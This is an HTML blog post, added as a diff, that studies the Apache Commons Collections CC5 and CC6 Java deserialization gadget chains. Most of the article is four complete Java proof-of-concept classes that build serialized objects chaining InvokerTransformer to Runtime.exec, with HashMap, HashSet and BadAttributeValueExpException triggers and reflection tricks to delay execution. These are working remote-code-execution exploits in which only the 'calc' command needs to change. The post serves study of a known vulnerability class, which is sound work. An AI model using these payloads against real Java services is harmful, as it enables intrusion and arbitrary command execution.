@@ -1,0 +1,575 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>CommonsCollections5 6 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>CommonsCollections5 6</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/3/3
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #ff7d73">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h1><pre><code class="ini">Gadget chain:
+        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+</code></pre>
+<p>相较于cc1 把LazyMap的上层改了 没有使用动态代理</p>
+<p>拼一下先</p>
+<p>然后去找调用get的</p>
+<p>调用get的非常多 这里选择的是<code>TiedMapEntry.toString()</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030807002.png" alt="image-20240303080650311"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030807992.png" alt="image-20240303080733554"></p>
+<p>toString也非常多</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030809346.png" alt="image-20240303080955216"></p>
+<p>这里用的BadAttributeValueExpException#ReadObject</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.ws.Action;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+
+public class CC5 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        BadAttributeValueExpException bavee = new BadAttributeValueExpException(new TiedMapEntry(lazyMap,null));
+
+
+//        byte[] bytes = serialize(bavee);
+//        System.out.println(Base64.getEncoder().encodeToString(bytes));
+        
+
+//        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+<p>我们发现在还没反序列化的时候就弹计算器了</p>
+<p>那么我们就要用反射赋值</p>
+<p>在生成的时候打断链子</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+
+
+public class CC5 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, null);
+        BadAttributeValueExpException bavee = new BadAttributeValueExpException(1);
+
+        Field fieldVal = bavee.getClass().getDeclaredField(&quot;val&quot;);
+        fieldVal.setAccessible(true);
+        fieldVal.set(bavee,tiedMapEntry);
+
+        byte[] bytes = serialize(bavee);
+//        System.out.println(Base64.getEncoder().encodeToString(bytes));
+
+
+        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+<h1 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h1><pre><code class="ini">Gadget chain:
+        java.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash()
+                   TiedMapEntry.hashCode()
+                    TiedMapEntry.getValue()
+                        LazyMap.get()
+                           ChainedTransformer.transform()
+                           InvokerTransformer.transform()
+</code></pre>
+<p><code>TiedMapEntry#hashCode</code>调了getValue</p>
+<p><code>HashMap#hash调了hashcode</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030909384.png" alt="image-20240303090927274"></p>
+<p><code>HashMap#readObject-&gt; HashMap#hash</code></p>
+<p>需要注意的是<code>HashMap#put</code>也调用了HashMap#hash 由HashSet#ReadObject可以跟进来</p>
+<h2 id="HashMap版"><a href="#HashMap版" class="headerlink" title="HashMap版"></a>HashMap版</h2><p>需要注意的是还没反序列化的时候就弹计算器了 需要手动断一下链子 反射补上 和 URLDNS那个是一个问题</p>
+<p><img src="https://img-blog.csdnimg.cn/db9bcf8b2d5240efb99a9c6adaa8ba27.png" alt="在这里插入图片描述"></p>
+<p>put完了之后进不去</p>
+<p>所以最后要remove掉put进去的key</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+
+
+
+public class CC6 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
+        HashMap&lt;Object, Object&gt; finalMap = new HashMap&lt;&gt;();
+        finalMap.put(tiedMapEntry,null);
+        lazyMap.remove(&quot;xxx&quot;);
+
+
+        Field fieldFactory = lazyMap.getClass().getDeclaredField(&quot;factory&quot;);
+        fieldFactory.setAccessible(true);
+        fieldFactory.set(lazyMap,chainedTransformer);
+        byte[] bytes = serialize(finalMap);
+
+        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+<h2 id="HashSet版"><a href="#HashSet版" class="headerlink" title="HashSet版"></a>HashSet版</h2><p>网上找了几篇都没写HashSet的 不知道为什么</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.HashSet;
+
+
+public class CC6 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
+        HashMap&lt;Object, Object&gt; finalMap = new HashMap&lt;&gt;();
+        finalMap.put(tiedMapEntry,null);
+        lazyMap.remove(&quot;xxx&quot;);
+
+
+        Field fieldFactory = lazyMap.getClass().getDeclaredField(&quot;factory&quot;);
+        fieldFactory.setAccessible(true);
+        fieldFactory.set(lazyMap,chainedTransformer);
+
+        HashSet hashSet = new HashSet(1,1);
+        Field fieldMap = HashSet.class.getDeclaredField(&quot;map&quot;);
+        fieldMap.setAccessible(true);
+        fieldMap.set(hashSet,finalMap);
+
+        byte[] bytes = serialize(hashSet);
+
+        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
